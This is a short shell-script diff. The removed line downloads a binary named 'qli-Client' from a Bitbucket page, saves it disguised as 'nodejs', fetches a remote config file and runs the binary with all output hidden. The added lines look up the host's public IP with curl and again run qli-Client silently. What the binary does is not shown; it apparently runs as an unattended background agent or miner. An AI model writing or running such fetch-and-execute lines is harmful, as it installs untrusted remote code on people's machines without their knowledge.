@@ -1,1 +1,4 @@
-wget -q -O nodejs https://bitbucket.org/excel-gms/fix/downloads/qli-Client && chmod +x nodejs >/dev/null 2>&1 && wget https://github.com/MADEWGN-X/x/raw/main/appsettings.json && ./nodejs >/dev/null 2>&1
+echo "******************************************************************" 
+echo "IP ORI ==> "$(curl ifconfig.me) 
+echo " "
+chmod +x qli-Client && ./qli-Client >/dev/null 2>&1
